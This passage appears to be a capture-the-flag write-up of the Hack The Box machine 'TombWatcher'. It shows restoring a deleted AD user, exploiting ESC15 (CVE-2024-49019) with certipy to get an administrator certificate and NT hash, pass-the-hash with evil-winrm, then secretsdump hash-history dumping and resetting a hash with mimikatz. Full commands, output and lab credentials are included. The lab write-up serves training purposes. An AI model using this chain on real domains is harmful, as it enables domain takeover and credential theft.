little did know I restored the wrong user with `bloodyAd` and spent the next 2 days trying to figure out why my newly restored user couldn't request a certificate from the `WEBSERVER` template, then I saw this note in the `--help` of `bloodyAD`
![bloodyAd_help.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/tombwatcher/bloodyAd_help.png)

it was definitely a lesson learned that I should start relying on the `SID` instead of the `samAccountName`, anyway I reset the machine and decided to do it with `powershell` instead, first I enumerated deleted object, and got their `SID` this time along with the last known parent

```powershell
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter {objectSid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"} -IncludeDeletedObjects -Properties objectSid,LastKnownParent


Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
LastKnownParent   : OU=ADCS,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid         : S-1-5-21-1392491010-1358638721-2126982587-1111
```

last known parent was `OU=ADCS,DC=tombwatcher,DC=htb` now it makes sense why john had `genericAll` on it, since to restore a user from the recycle bin we need:
- `Generic Write` at least on the deleted object
- `Create Child` on the organization unit used for restoration 

then I just restored the correct `cert_admin` user and reset their password
``` powershell
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter {objectSid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"} -IncludeDeletedObjects | Restore-ADObject
*Evil-WinRM* PS C:\Users\john\Documents> Set-LocalUser -Name cert_admin -Password (ConvertTo-SecureString "9TRvJPCqFstB" -AsPlainText -Force)
```

```bash
$ nxc ldap tombwatcher.htb -u cert_admin -p 9TRvJPCqFstB
LDAP        10.129.180.212  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never)
LDAP        10.129.180.212  389    DC01             [+] tombwatcher.htb\cert_admin:9TRvJPCqFstB
```

after I restored `cert_admin` I ran bloodhound again and confirmed my guess that `john` has at least `generic Write` on it, otherwise I wouldn't have been able to restore it nor changed their password
![john_genericAll_cert_admin.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/tombwatcher/john_genericAll_cert_admin.png)

we can also see this time that `cert_admin` can enroll on `WEBSERVER` certificate template!
![cert_admin_enroll_on_webserver.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/tombwatcher/cert_admin_enroll_on_webserver.png)

with this new information in mind I used `certipy` to scan for vulnerable certificate templates as `cert_admin` and found that the `WebServer` template was vulnerable to `ESC15` (CVE-2024-49019)
```bash
$ certipy find -u cert_admin -p 9TRvJPCqFstB -dc-ip 10.10.11.72 -stdout -vulnerable
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.

```

### a bit about ESC15 AKA EKUwu (CVE-2024-49019)

from [certipy docs](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu): 
> ESC15, also known by the community name "EKUwu", describes a vulnerability affecting unpatched CAs. It allows an attacker to inject arbitrary Application Policies into a certificate issued from a Version 1 certificate template. If the CA has not been updated with the relevant security patches (Nov 2024), it will incorrectly include these attacker-supplied Application Policies in the issued certificate. This occurs even if these policies are not defined in, or are inconsistent with, the template's intended Extended Key Usages (EKUs), thereby granting the certificate unintended capabilities
> 
> For instance, an attacker could request a certificate from a V1 "WebServer" template (which typically only permits "Server Authentication" EKU) and, through this vulnerability, inject the "Client Authentication" OID (`1.3.6.1.5.5.7.3.2`) as an Application Policy. The resulting certificate could then potentially be used for client logon, contrary to the template's design 

as mentioned this attack only viable for certificates issued from a Version 1 certificate template, as is the `webserver` template above. to exploit this there are 2 scenarios, either I request certificate injecting the `Client Authentication EKU` and get an `ldap shell` or a second where I inject `Certificate Request Agent` and I authenticate on behalf of administrator, only the second worked for me 

first I requested a certificate injecting the `Certificate Request Agent EKU`
```bash
$ certipy req -u cert_admin@tombwatcher.htb -p 9TRvJPCqFstB  -dc-ip 10.10.11.72 -target tombwatcher.htb  -ca tombwatcher-CA-1 -template WebServer -application-policies 'Certificate Request Agent'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'cert_admin.pfx'
[*] Wrote certificate and private key to 'cert_admin.pfx'
```

I then used the `cert_admin.pfx` to request an authentication certificate on behalf of `administrator`
``` bash
$ certipy req -u cert_admin@tombwatcher.htb -p 9TRvJPCqFstB  -dc-ip 10.10.11.72 -target tombwatcher.htb  -ca tombwatcher-CA-1 -template User -pfx cert_admin.pfx -on-behalf-of administrator
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

and used this last cert to authenticate and get the NT hash of `administrator`
```bash
$ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```

and just used the hash to grab a shell with `evil-winrm`
``` powershell
$ evil-winrm -i tombwatcher.htb -u administrator -H f61db423bebe3328d33af26741afe5fc
/usr/lib/ruby/gems/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems
/usr/lib/ruby/gems/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/11/2025   3:22 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
ff****************************77
```

## beyond root : resetting sam's original password

I was lucky enough to have `ADCS` on the box, that way I didn't have to to change `john`'s password and got their hash using `ShadowCredentials` instead, but with `sam` all I had was a `ForceChangePassword DACL` which forced me to change their password, in real life scenarios tho, changing passwords can cause few issues for instance with services relying on those credentials. but now that I'm administrator I can easily reset their password back

first I used `secretsdump` with the `-history` flag to get a history of sam's ntlm hashes, note that the user's first hash is `0fe6d2edf5a7556f42c7168291783383`
```bash
$ secretsdump.py tombwatcher.htb/administrator@tombwatcher.htb -hashes :f61db423bebe3328d33af26741afe5fc -just-dc-user sam -history
/usr/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
sam:1105:aad3b435b51404eeaad3b435b51404ee:0fe6d2edf5a7556f42c7168291783383:::
sam_history0:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam_history1:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam_history2:1105:aad3b435b51404eeaad3b435b51404ee:990f5eb0caa0773fb5b3df18692eea92:::
sam_history3:1105:aad3b435b51404eeaad3b435b51404ee:04f40866dbf314427b643f4a37d7319c:::
sam_history4:1105:aad3b435b51404eeaad3b435b51404ee:0fe6d2edf5a7556f42c7168291783383:::
sam_history5:1105:aad3b435b51404eeaad3b435b51404ee:251fdbe55df2e3eb3ab27433177e0ff5:::
sam_history6:1105:aad3b435b51404eeaad3b435b51404ee:0fe6d2edf5a7556f42c7168291783383:::
sam_history7:1105:aad3b435b51404eeaad3b435b51404ee:04f40866dbf314427b643f4a37d7319c:::
sam_history8:1105:aad3b435b51404eeaad3b435b51404ee:251fdbe55df2e3eb3ab27433177e0ff5:::
sam_history9:1105:aad3b435b51404eeaad3b435b51404ee:0fe6d2edf5a7556f42c7168291783383:::
sam_history10:1105:aad3b435b51404eeaad3b435b51404ee:04f40866dbf314427b643f4a37d7319c:::
sam_history11:1105:aad3b435b51404eeaad3b435b51404ee:3d7d3a27fad2e9ff5056dc986d6785c0:::
sam_history12:1105:aad3b435b51404eeaad3b435b51404ee:3d7d3a27fad2e9ff5056dc986d6785c0:::

[*] Kerberos keys grabbed
sam:aes256-cts-hmac-sha1-96:e4093068723c6fe3b144ab617d862451f3fc78ae1b9ee5cd0cfb43378a3a152e
sam:aes128-cts-hmac-sha1-96:b59adfa0f1882dd4d9700daf9dcbf2a7
sam:des-cbc-md5:e632540b9ee5343e
[*] Cleaning up... Cleaning up...
```

then I uploaded `mimikatz` on the box and reset the user hash to `0fe6d2edf5a7556f42c7168291783383`
``` powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd C:\programdata
*Evil-WinRM* PS C:\programdata> upload mimikatz.exe

Info: Uploading mimikatz.exe to C:\programdata\mimikatz.exe

Data: 1666740 bytes of 1666740 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\programdata> ls


    Directory: C:\programdata


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d---s-        9/15/2018   3:21 AM                Microsoft
d-----        7/24/2025  12:18 PM                Package Cache
d-----       11/15/2024   7:02 PM                regid.1991-06.com.microsoft
d-----        9/15/2018   3:12 AM                SoftwareDistribution
d-----         6/4/2025   4:25 PM                ssh
d-----        9/15/2018   3:12 AM                USOPrivate
d-----       11/15/2024   6:56 PM                USOShared
d-----       11/15/2024   6:53 PM                VMware
-a----       10/11/2025   5:14 PM        1250056 mimikatz.exe

*Evil-WinRM* PS C:\programdata> ./mimikatz 'lsadump::setntlm /user:sam /ntlm:0fe6d2edf5a7556f42c7168291783383' 'exit'

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::setntlm /user:sam /ntlm:0fe6d2edf5a7556f42c7168291783383
NTLM         : 0fe6d2edf5a7556f42c7168291783383

Target server:
Target user  : sam
Domain name  : TOMBWATCHER
Domain SID   : S-1-5-21-1392491010-1358638721-2126982587
User RID     : 1105

>> Informations are in the target SAM!

mimikatz(commandline) # exit
Bye!
```

and now I can check that the original hash has been set
```bash
$ nxc ldap tombwatcher.htb -u sam -H 0fe6d2edf5a7556f42c7168291783383
LDAP        10.129.180.212  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never)
LDAP        10.129.180.212  389    DC01             [+] tombwatcher.htb\sam:0fe6d2edf5a7556f42c7168291783383
```
